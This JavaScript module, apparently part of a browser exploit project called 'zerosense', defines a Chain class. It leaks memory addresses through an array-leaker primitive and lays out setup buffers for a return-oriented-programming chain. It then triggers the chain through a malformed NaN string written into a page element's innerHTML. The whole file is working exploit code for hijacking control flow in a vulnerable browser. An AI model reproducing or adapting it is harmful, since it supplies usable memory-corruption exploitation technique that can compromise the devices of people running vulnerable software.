/*eslint-disable no-param-reassign */

var Util = require('zerosense/Util');

class Chain {
	
	constructor(cb) {
		this.cb = cb;
		
		this.addrChainStart = 0;
	}
	
	setup2Make(addr) {
		return Util.pad(0x30)
			+ Util.int32(addr);
	}
	
	setup1Make(addr) {		
		return Util.int32(addr);
	}
	
	prepare(arrayLeaker) {
		var i = 10;
	
		var addrData = arrayLeaker.setAndGetAddress(i++, this.cb.getData());
		if (addrData === null) {
			throw new Error("Failed to get chain data address.");
		}
		logger.info(`Found chain data at 0x${addrData.toString(16)}`);
		this.cb.updateDataAddress(addrData);
		
		var addrStack = arrayLeaker.setAndGetAddress(i++, this.cb.getChain());
		if (addrStack === null) {
			throw new Error("Failed to get chain stack address.");
		}
		logger.info(`Found chain stack at 0x${addrStack.toString(16)}`);
		var chainStackOffset = 0x4;
		
		var setup2 = this.setup2Make(addrStack + chainStackOffset);
		var addrSetup2 = arrayLeaker.setAndGetAddress(i++, setup2);
		if (addrSetup2 === null) {
			throw new Error("Failed to get setup2 address.");
		}
		logger.info(`Found setup2 at 0x${addrSetup2.toString(16)}`);
		
		var setup1 = this.setup1Make(addrSetup2);
		var addrSetup1 = arrayLeaker.setAndGetAddress(i++, setup1);
		if (addrSetup1 === null) {
			throw new Error("Failed to get setup1 address.");
		}
		logger.info(`Found setup1 at 0x${addrSetup1.toString(16)}`);
		
		this.addrChainStart = addrSetup1;
		logger.info(`Chain start at 0x${this.addrChainStart.toString(16)}`);
	}
	
	getData() {
		return this.cb.getData();
	}
	
	getChain() {
		return this.cb.getChain();
	}
	
	getDataOffset(id) {
		return this.cb.getDataOffset(id);
	}
	
	execute() {
		if (this.addrChainStart === 0) {
			throw new Error("addrChainStart is null");
		}
		
		logger.info(`Starting chain at 0x${this.addrChainStart.toString(16)}`);
		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
	}
	
}

module.exports = Chain;